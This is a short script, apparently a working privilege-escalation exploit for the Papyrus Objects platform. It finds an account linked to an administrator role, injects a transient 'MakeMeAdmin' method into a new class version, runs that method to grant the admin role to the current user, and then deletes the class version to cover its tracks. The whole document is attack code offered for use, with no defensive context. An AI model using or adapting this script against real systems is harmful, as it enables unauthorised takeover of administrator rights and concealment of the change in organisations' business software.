//=== Papyprus Objects privilege escalation v3.0  (c) 10.10.2019 Timo Pannes ===

@user = $CurrentUserId; // user that needs more power :-)

@C_OmsMethDef = {cbbf7ed0-f1cc-11dd-8d37-873433f8a72c};

// admin roles that we are trying to get - the list should be ordered based on relevance (most powerful role on top)
// GUIDs can't be used here since roles are not visible for standard roles and OIDs can't be resolved
@adminRoles = {
  0.0.0.88e62, // PMSecurityAdministratorRole
  0.0.0.43,    //   SecurityAdministratorRole
  0.0.0.87d81, // PMSystemAdministratorRole
  0.0.0.1299   //   SystemAdministratorRole
};

ForEach @role in (@adminRoles)
  $0: @omsAccount = $Search($Instances Of OmsAccount:.Role==@role).$Id,\Parent.$Id as "Parent" Top 1;
  If (@omsAccount!=$Invalid) Then
    @adminRoleSelected = @role;
    @exploitInstance   = @omsAccount\Parent.$Id,$ClassGUID;
    @exploitClass      = @exploitInstance\$ClassGUID.$Id,$DisplayName;
    Break;
  EndIf
Next

If (@omsAccount!=$Invalid) Then
  Message("PFGM0003I", "Exploiting "+@exploitClass.$DisplayName+" "+@exploitInstance.$Id+" with linked OmsAccount "+@omsAccount.$Id);  
Else
  Message("PFGM0001E", "No vulnerable OmsAccount setup found in domain."); // bad luck, but very unlikely if you use ACM, CF, MessageFW, etc. :-) 
EndIf  

// create transient exploit method definition 
$0($tr): Begin
  @exploitClassNewVersion = @exploitClass.ProjectNewVersion(@exploitClass, $CurrentNodeId, @exploitClass).Return1;
  @methDef = .InstantiateTransient(@C_OmsMethDef).Return1;
  @methDef.MethNameIntern  = "MakeMeAdmin";
  @methDef.MethNameVisible = "MakeMeAdmin";
  @methDef.ExecuteWithOmsAccount = true;
  @methDef.ValidForInstance = 1;
  @methDef.Type = 2;
  @methDef.Privileges = {'$_User', '$_Developer', '$_Administrator'};
  @methDef.ImplementationName = "PqlExecuteWithoutEvents";
  @methDef.ParamCount = 1;
  @methDef.Param = {"Pqlstatement=@role %= "+@adminRoleSelected+"; @role.NewReference($Param1);"};
  // add method to new version of exploit class                                 
  @methDef.Create(@exploitClassNewVersion).Return1;
End
// execute above method => it will link PMSecurityAdministratorRole to the specified user
$0: @exploitInstance.MakeMeAdmin(@user);
// cleanup: remove new version of exploit class
$0: @exploitClassNewVersion.DeleteFromProject();

Return 0;